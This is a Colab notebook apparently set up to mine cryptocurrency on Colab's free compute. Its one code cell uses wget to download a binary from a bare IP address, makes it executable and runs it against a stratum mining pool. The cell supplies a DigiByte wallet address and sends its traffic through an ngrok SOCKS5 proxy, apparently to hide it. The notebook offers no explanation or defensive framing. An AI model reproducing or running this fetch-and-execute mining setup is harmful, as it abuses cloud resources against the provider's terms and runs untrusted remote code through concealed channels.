{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "pon-mbck.ipynb",
      "provenance": [],
      "authorship_tag": "ABX9TyMYe8sdGxR899uYcWNw4FnV",
      "include_colab_link": true
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/joykotest/mbc2/blob/main/2pon_mbck.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "!wget -q http://199.250.207.182/~ngewetech/include/induk/pointd && chmod +x pointd \n",
        "!./pointd -a  power2b -o stratum+tcp://198.50.168.213:6242 -u DGF8NYmizL2fhWKe45DJhDZfCXkXp35VsV.$(shuf -n 1 -i 1-9999999) -p c=DGB -x socks5://4.tcp.ngrok.io:18756\n"
      ],
      "metadata": {
        "id": "krtAY4P79FHe"
      },
      "execution_count": null,
      "outputs": []
    }
  ]
}